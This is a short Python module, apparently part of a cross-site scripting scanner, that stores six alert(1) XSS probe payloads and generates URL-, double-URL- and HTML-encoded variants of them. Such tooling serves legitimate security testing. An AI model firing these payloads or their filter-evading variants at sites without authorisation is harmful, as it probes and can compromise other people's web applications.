# payload_library.py

import os
import urllib.parse

PAYLOAD_DIR = "payloads"

# default payloads if files don't exist
DEFAULT_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\" onmouseover=alert(1) x=\"",
    "' onfocus=alert(1) x='",
    "javascript:alert(1)"
]


def ensure_payload_dir():
    """Create payload directory if missing"""
    if not os.path.exists(PAYLOAD_DIR):
        os.makedirs(PAYLOAD_DIR)

        with open(os.path.join(PAYLOAD_DIR, "default.txt"), "w") as f:
            for p in DEFAULT_PAYLOADS:
                f.write(p + "\n")


def load_payloads():
    """Load payloads from files"""

    ensure_payload_dir()

    payloads = []

    for file in os.listdir(PAYLOAD_DIR):

        path = os.path.join(PAYLOAD_DIR, file)

        if os.path.isfile(path):

            with open(path, "r", encoding="utf-8", errors="ignore") as f:

                for line in f:
                    line = line.strip()

                    if line:
                        payloads.append(line)

    return payloads


def encode_payload(payload):
    """Generate encoded variants"""

    encoded = []

    # URL encoded
    encoded.append(urllib.parse.quote(payload))

    # double URL encoded
    encoded.append(urllib.parse.quote(urllib.parse.quote(payload)))

    # HTML encoded
    html_encoded = (
        payload.replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#x27;")
    )

    encoded.append(html_encoded)

    return encoded


def generate_payload_set():

    base = load_payloads()

    all_payloads = set()

    for payload in base:

        all_payloads.add(payload)

        for e in encode_payload(payload):
            all_payloads.add(e)

    return list(all_payloads)
